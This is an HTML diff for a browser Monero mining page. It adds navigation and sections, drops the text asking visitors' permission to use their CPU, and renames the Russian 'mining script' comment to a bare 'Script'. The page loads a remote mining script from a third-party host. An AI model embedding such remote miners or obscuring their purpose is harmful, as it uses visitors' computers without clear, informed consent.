@@ -3,29 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mining Website</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>Monero Mining Website</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <header>
-        <h1>Support Us with Mining</h1>
-        <p>By allowing us to use a small percentage of your CPU power, you help keep our website running.</p>
+        <h1>Monero Mining Dashboard</h1>
+        <nav>
+            <a href="#about">About</a>
+            <a href="#features">Features</a>
+            <a href="#contact">Contact</a>
+        </nav>
     </header>
+
     <main>
-        <h2>Mining Controls</h2>
-        <p>Hashrate: <span id="hash-rate">0</span> H/s</p>
-        <p>Total Hashes: <span id="total-hashes">0</span></p>
-        <button id="start-mining">Start Mining</button>
-        <button id="stop-mining" disabled>Stop Mining</button>
+        <section id="about">
+            <h2>About Mining</h2>
+            <p>Start mining Monero (XMR) directly from your browser. Use this site to contribute computational power.</p>
+        </section>
+
+        <section id="features">
+            <h2>Mining Controls</h2>
+            <button id="start-mining">Start Mining</button>
+            <button id="stop-mining" disabled>Stop Mining</button>
+            <p><strong>Hashrate:</strong> <span id="hash-rate">0</span> H/s</p>
+            <p><strong>Total Hashes:</strong> <span id="total-hashes">0</span></p>
+        </section>
     </main>
+
     <footer>
-        <p>&copy; 2024 Mining Website. Thanks for your support!</p>
+        <p>&copy; 2024 Monero Mining. All rights reserved.</p>
     </footer>
 
-    <!-- Подключение скрипта для майнинга -->
+    <!-- Script -->
     <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <!-- Подключение пользовательского JS -->
     <script src="miner.js"></script>
 </body>
 </html>
